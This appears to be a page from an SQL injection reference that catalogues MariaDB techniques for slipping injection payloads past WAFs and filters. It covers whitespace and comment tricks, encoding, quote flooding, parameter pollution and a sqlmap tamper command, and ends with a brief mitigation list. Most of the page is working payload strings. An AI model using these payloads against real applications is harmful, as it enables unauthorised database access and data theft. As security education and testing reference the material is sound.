---
title: Fuzzing and Obfuscation
description: Techniques for bypassing WAFs and filters in MariaDB injection
category: Advanced Techniques
order: 20
tags: ["bypass", "WAF", "obfuscation", "filter evasion"]
lastUpdated: 2025-12-18
---

## Fuzzing and Obfuscation

Modern web applications often employ Web Application Firewalls (WAFs) and other security measures to detect and block SQL injection attempts. Fuzzing and obfuscation techniques can help bypass these protections by disguising SQL injection payloads.

### Comment Variations

MariaDB supports various comment styles that can be inserted between SQL tokens (keywords, identifiers, operators), but **cannot split tokens themselves** (e.g., `SEL/**/ECT` is invalid).

```sql
-- Comments BETWEEN tokens (valid)
SELECT/*comment*/username,password/**/FROM/**/users

-- Hash comment (comments to end of line)
SELECT # comment
username FROM users WHERE id = 1

-- C-style comments
SELECT /* comment */ username FROM users

-- Executable comments (MySQL/MariaDB extension, content is executed)
SELECT /*! username */ FROM users

-- Line comment (requires space after --)
SELECT * FROM users -- this is a comment
```

### Comment Limitations

```sql
-- INVALID: Comments cannot split keywords
SEL/**/ECT username FROM users
-- Syntax error: SEL is not a valid keyword

-- INVALID: Split UNION keyword
SELECT 1 UNI/**/ON SELECT 2
-- Syntax error

-- VALID: Comments BETWEEN complete tokens
SELECT/**/ username /**/FROM/**/ users WHERE id = 1
```

### Whitespace Manipulation

MariaDB is generally flexible with whitespace, allowing creative formatting.

#### Allowed Intermediary Characters (Whitespace Alternatives)

These characters can substitute for spaces in MariaDB queries:

| Hex  | Dec | Character          | URL Encoded |
| ---- | --- | ------------------ | ----------- |
| 0x09 | 9   | Horizontal Tab     | %09         |
| 0x0A | 10  | New Line (LF)      | %0A         |
| 0x0B | 11  | Vertical Tab       | %0B         |
| 0x0C | 12  | Form Feed/New Page | %0C         |
| 0x0D | 13  | Carriage Return    | %0D         |
| 0x20 | 32  | Space              | %20         |

**Note:** U+00A0 (Non-breaking Space / 0xA0) does NOT work as whitespace in MariaDB's SQL lexer. Only ASCII whitespace characters (0x09–0x0D and 0x20) are valid for tokenization.

**Characters that do NOT work as whitespace:**

- 0x00 (NULL byte)
- 0x01–0x08 (Control characters)
- 0x0E–0x1F (Control characters)
- 0xA0 (Non-breaking Space / NBSP)
- Any characters above 0xFF

**Example payload:**

```text
'%0A%09UNION%0CSELECT%0BNULL%20%23
```

#### Whitespace Examples

```sql
-- Using tabs, newlines, and carriage returns
SELECT
username
FROM
users

-- Using vertical tab and form feed (less common but valid)
SELECT%0Busername%0CFROM%0Busers

-- Excessive whitespace
SELECT       username       FROM       users

-- Mixed whitespace in UNION injection
SELECT id, username FROM users WHERE id = 1 UNION

SELECT 999, 'mixed_ws'
```

#### Whitespace in UNION SELECT Context

Alternative whitespace characters between UNION and SELECT:

```sql
-- Tab between UNION and SELECT
SELECT id FROM users UNION  SELECT 999

-- Newline between UNION and SELECT
SELECT id FROM users UNION
SELECT 999

-- Carriage return (%0D) between UNION and SELECT
SELECT id FROM users UNION%0DSELECT 999

-- Form feed (%0C) between UNION and SELECT
SELECT id FROM users UNION%0CSELECT 999

-- Vertical tab (%0B) also works
SELECT id FROM users UNION%0BSELECT 999
```

#### Characters Allowed After AND/OR

These characters can immediately follow `AND` or `OR` without spaces:

| Hex  | Character | Description |
| ---- | --------- | ----------- |
| 0x20 | (space)   | Space       |
| 0x2B | +         | Plus        |
| 0x2D | -         | Minus       |
| 0x7E | ~         | Tilde       |
| 0x21 | !         | Exclamation |
| 0x40 | @         | At sign     |

**Example payloads:**

```sql
-- Using + after OR
1 OR+1=1

-- Using - after AND
1 AND-1=-1

-- Using ~ after OR (bitwise NOT)
SELECT * FROM users WHERE id = 999 OR~0

-- Using ! after AND (logical NOT)
SELECT * FROM users WHERE id = 1 AND!0

-- Using @ for variable reference
SELECT * FROM users WHERE id = 1 OR@a
```

#### Characters After SELECT Without Space

Certain characters can immediately follow SELECT without whitespace:

| Character | Description    | Example        |
| --------- | -------------- | -------------- |
| `'`       | Quote (string) | `SELECT'test'` |
| `-`       | Unary minus    | `SELECT-1`     |
| `+`       | Unary plus     | `SELECT+1`     |
| `(`       | Parentheses    | `SELECT(1)`    |
| `~`       | Bitwise NOT    | `SELECT~1`     |
| `!`       | Logical NOT    | `SELECT!0`     |

```sql
-- Quote starts string literal immediately after SELECT
SELECT'test' AS val

-- Unary operators work without space
SELECT-1 AS val
SELECT+1 AS val
SELECT~1 AS val
SELECT!0 AS val

-- Parentheses work without space
SELECT(1) AS val

-- Note: Scientific notation does NOT work immediately after SELECT
SELECT.1e1 AS val  -- Syntax error in MariaDB (parser sees SELECT.1e1 as invalid)
```

#### Parentheses as Whitespace Alternatives

```sql
-- No spaces needed with parentheses
UNION(SELECT(column)FROM(table))

-- Complex example
SELECT(username)FROM(users)WHERE(id=1)

-- Nested parentheses
SELECT id, username FROM users WHERE id = 1 UNION((SELECT 999, 'nested'))

-- UNION without space using parentheses
SELECT 1 AS val UNION(SELECT 2)
```

### Case Variation

MariaDB keywords are case-insensitive, but identifier case-sensitivity depends on the operating system:

```sql
-- Keywords can be any case
select username from users where id=1
SeLeCt username FrOm users WhErE id=1
SELECT username FROM users WHERE id=1
```

**Note on identifier case sensitivity:**

- **Linux/Unix:** Table and database names are case-sensitive (filesystem-dependent)
- **Windows/macOS:** Table names are case-insensitive by default
- **Column names:** Always case-insensitive in MariaDB

This means `SELECT * FROM USERS` may fail on Linux if the table was created as `users`. The `lower_case_table_names` system variable controls this behavior:

| Value | Storage     | Comparison       | Default Platform |
| ----- | ----------- | ---------------- | ---------------- |
| 0     | As declared | Case-sensitive   | Linux/Unix       |
| 1     | Lowercase   | Case-insensitive | Windows          |
| 2     | As declared | Case-insensitive | macOS            |

**Cross-platform implications:** When migrating databases between platforms with different defaults, identifier mismatches can occur. For maximum portability across platforms, set `lower_case_table_names=1` on all systems before database initialization. Note that this variable cannot be changed after the database is initialized.

### Operator Alternatives

Many operators have alternative representations:

```sql
-- OR alternatives
1 OR 1=1
1 || 1=1
1 OR '1'='1'

-- AND alternatives
1 AND 1=1
1 && 1=1

-- Equal alternatives
id=1
id<=>1
```

#### NULL-Safe Equal Operator

The `<=>` operator is NULL-safe, meaning `NULL <=> NULL` returns 1 (true), unlike regular `=` where `NULL = NULL` returns NULL:

```sql
-- NULL-safe equal with NULL comparison
SELECT NULL <=> NULL AS result
-- Returns: 1

-- Regular equal with NULL
SELECT NULL = NULL AS result
-- Returns: NULL

-- Useful for injection bypass
SELECT * FROM users WHERE id <=> 1
```

### String Representation

Strings can be represented in multiple ways:

```sql
-- Hex encoding
SELECT * FROM users WHERE username = 0x61646d696e -- 'admin' in hex

-- Using CHAR function (basic form)
SELECT * FROM users WHERE username = CHAR(97, 100, 109, 105, 110) -- 'admin'

-- CHAR with character set
SELECT * FROM users WHERE username = CHAR(97,100,109,105,110 USING utf8)

-- Concatenation
SELECT * FROM users WHERE username = CONCAT('ad', 'min')

-- Concatenation with function transformations
SELECT * FROM users WHERE username = CONCAT(LOWER('AD'), LOWER('MIN'))

-- Binary string notation
SELECT b'01100001' AS val
-- Returns: 'a' (binary)

-- UNHEX for string obfuscation
SELECT UNHEX('61646d696e') AS val
-- Returns: 'admin'
```

### Numeric Representation

Numbers can be represented in various ways:

```sql
-- Mathematical expressions
SELECT * FROM users WHERE id = 1+0
SELECT * FROM users WHERE id = 2-1

-- Boolean conversions
SELECT * FROM users WHERE id = true+0 -- true = 1
SELECT * FROM users WHERE id = false+1 -- false = 0, so false+1 = 1

-- Hexadecimal
SELECT * FROM users WHERE id = 0x1 -- hex for 1

-- Scientific notation
SELECT * FROM users WHERE id = 1e0
```

### Function Call Obfuscation

Function names cannot be dynamically constructed, but execution can be obfuscated:

```sql
-- Subquery instead of direct value
SELECT * FROM users WHERE id = (SELECT 1)

-- Using prepared statements for dynamic execution
SET @x = 'SELECT * FROM users';
PREPARE stmt FROM @x;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

-- Note: CONCAT cannot construct SQL keywords
SELECT CONCAT('SEL','ECT') AS keyword
-- Returns: 'SELECT' (a string, not executed as keyword)
```

### UNION Query Obfuscation

```sql
-- Adding redundant WHERE (requires FROM clause)
1 UNION SELECT 1,2,3 FROM dual WHERE 1=1

-- Using NULL values
1 UNION SELECT NULL,NULL,(SELECT username FROM users LIMIT 1)

-- Nested UNIONs with derived table
1 UNION (SELECT * FROM (SELECT 1,2,3)x)

-- UNION ALL vs UNION (preserves duplicates)
SELECT 1 AS val UNION ALL SELECT 1 UNION ALL SELECT 2
-- Returns 3 rows (1, 1, 2)

-- UNION deduplicates
SELECT 1 AS val UNION SELECT 1 UNION SELECT 2
-- Returns 2 rows (1, 2)

-- CASE WHEN in UNION injection
SELECT id, username FROM users WHERE id = 1
UNION ALL SELECT 999, (CASE WHEN (1=1) THEN 'true_branch' ELSE 'false_branch' END)
```

**Note on WHERE without FROM:** MariaDB behavior may vary by version:

- Some versions require `FROM dual` when using WHERE
- Modern versions may allow `SELECT 1 WHERE 1=1` without FROM

### Encoding Bypasses

#### URL Encoding

```text
-- Standard URL encoding (RFC 3986)
%74able_%6eame → table_name

-- Double URL encoding (decoded twice by server)
%2574able_%256eame → table_name

-- Legacy %uXXXX encoding (non-standard)
%u0074able_%u006eame → table_name
```

**Note on `%uXXXX` encoding:** This is a legacy JavaScript escape format, not RFC 3986 compliant. Modern servers don't reliably interpret it, but it may still work for WAF bypasses due to inconsistent decoding across layers.

### Comment Obfuscation with Newlines

Using newlines within comment sequences to bypass pattern matching:

```sql
-- Vulnerable query:
SELECT * FROM users WHERE id='[INPUT]' AND active=1

-- Injection payload (multi-line):
1'#
AND 0--
UNION SELECT 1,2,3

-- Resulting query (as MariaDB sees it):
SELECT * FROM users WHERE id='1'#
AND 0--
UNION SELECT 1,2,3' AND active=1
```

The `#` comments out the rest of line 1, and the remaining lines execute. This breaks up the payload across multiple lines, evading single-line pattern matching by WAFs.

```sql
-- Hash comment with newline injection
SELECT * FROM users WHERE id = '1'#
OR 1=1--

-- Multiline comment bypass
SELECT * FROM users WHERE id = 1/*
comment
*/OR 1=1
```

### Keyword Bypass Techniques

#### Spaces in Identifiers

MariaDB allows spaces around dots in qualified names:

```sql
information_schema . tables
information_schema . columns
```

#### Backtick Escaping

Use backticks to quote identifiers:

```sql
`information_schema`.`tables`
`information_schema`.`columns`
```

#### Comments Around Dots

```sql
-- Comments around the dot in qualified names
SELECT table_name FROM information_schema/**/./**/tables LIMIT 1

-- Combined with spaces
SELECT column_name FROM information_schema . columns LIMIT 1
```

#### Version-Specific Execution

```sql
-- Always executed by MariaDB
/*! SELECT */ * FROM users

-- Version-conditional: only on MySQL/MariaDB >= 5.0.0
/*!50000 SELECT */ * FROM users
```

#### Symbol Spam

Using valid arithmetic operators to confuse WAFs:

```sql
-- Valid SQL using multiple operators
SELECT * FROM users WHERE id = 1 AND -+--+--+~0

-- With double tilde
SELECT * FROM users WHERE id = 1 AND -+--+--+~~((1))
```

These constructs are syntactically valid due to MariaDB's handling of unary operators.

#### Quote Flooding

Using excessive quotes to bypass WAFs that count quotes:

```sql
-- Using multiple escaped quotes
SELECT '1'''''''''''''UNION SELECT '2'
-- The quotes escape each other: '1'''''' is the string "1'''"

-- Quote flooding in WHERE clause
SELECT id FROM users WHERE id = '1'''''''''''''OR'1'='1'

-- Even vs odd quote counts produce different results
SELECT '1''''''''''''UNION SELECT ''2'
-- Single result due to different quote escaping
```

**How it works:** In MariaDB, two consecutive single quotes inside a string literal escape to one quote. `'1''''''` means the string contains `1'''`. WAFs that simply count quotes may misinterpret the structure.

### Practical Examples

#### Bypassing Simple Keyword Filters

If 'SELECT' is blocked:

```sql
-- Using MariaDB executable comment
/*! SELECT */ username FROM users

-- Using alternate whitespace to break pattern matching
SELECT%09username%0AFROM%0Dusers

-- Using parentheses instead of spaces
(SELECT(username)FROM(users))
```

**Note:** String concatenation (`CONCAT('SEL','ECT')`) cannot be used to construct SQL keywords. Keywords must appear literally in the query.

#### Information Schema Queries with Hex

```sql
-- Table name with hex encoding in LIKE
SELECT table_name FROM information_schema.tables WHERE table_name LIKE 0x7573657273 LIMIT 1
-- 0x7573657273 = 'users'

-- Subquery with information_schema
SELECT * FROM (SELECT table_name FROM information_schema.tables WHERE table_name LIKE 0x7573657273 LIMIT 1)x

-- Using backticks on all identifiers
SELECT `column_name` FROM `information_schema`.`columns` WHERE `table_name` = 'users' LIMIT 1
```

#### Bypassing WAF Pattern Recognition

```sql
-- Complex nested logic
SELECT id, username FROM users WHERE id = 1 AND NOT 1=2
UNION ALL SELECT 999, (CASE WHEN (1=1) THEN 'case_test' ELSE 'other' END)

-- Mixing encoding techniques
SELECT * FROM users WHERE id = 1 AND 0x1=0x1
UNION SELECT 1, UNHEX('61646D696E')
```

#### HTTP Parameter Pollution

Some WAFs can be bypassed by splitting the payload across multiple parameters:

```text
?id=1/*&id=*/UNION/*&id=*/SELECT/*&id=*/1,2,3
```

### Automated Fuzzing

Tools like SQLMap include fuzzing capabilities to automatically test various bypass techniques:

```bash
sqlmap --url="http://target/page.php?id=1" --tamper=space2comment,charencode --random-agent
```

### Mitigation

To protect against obfuscation techniques:

1. Use parameterized queries instead of string concatenation
2. Implement a WAF with updated signatures
3. Use positive security models (whitelist valid patterns)
4. Limit the database user's privileges
5. Monitor and rate-limit suspicious queries
6. Use security testing tools to validate protections
